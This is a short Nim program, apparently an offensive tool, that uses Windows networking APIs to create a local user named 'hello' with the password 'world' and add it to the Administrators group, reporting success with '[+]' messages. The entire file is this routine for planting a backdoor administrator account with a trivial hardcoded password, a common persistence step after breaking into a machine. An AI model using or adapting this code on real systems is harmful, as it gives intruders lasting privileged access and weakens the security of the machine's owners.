import winim/net
import winim/lean

proc addUser(username:ptr WCHAR,password:ptr WCHAR):void =
  var groupname = "Administrators"
  var userinfo = USER_INFO_1(
    usri1_name: username,
    usri1_password : password,
    usri1_priv : USER_PRIV_USER,
    usri1_flags: UF_SCRIPT
  )

  var dwError = DWORD 0
  var account = LOCALGROUP_MEMBERS_INFO_3(
    lgrmi3_domainandname: userInfo.usri1_name
  )

  var addVal = NetUserAdd(nil, 1, cast[LPBYTE](&userInfo), &dwError)

  if addVal != NERR_Success:
    echo addVal
  else:
    echo "[+]User Add Successful !!!"

  var groupVal = NetLocalGroupAddMembers(nil, groupname, 3, cast[LPBYTE](&account), 1)
  # echo userinfo

  if groupVal != NERR_Success:
    echo groupVal
  else:
    echo "[+]User Add to Administrator Group Successful !!!"


when isMainModule:
  addUser("hello","world")
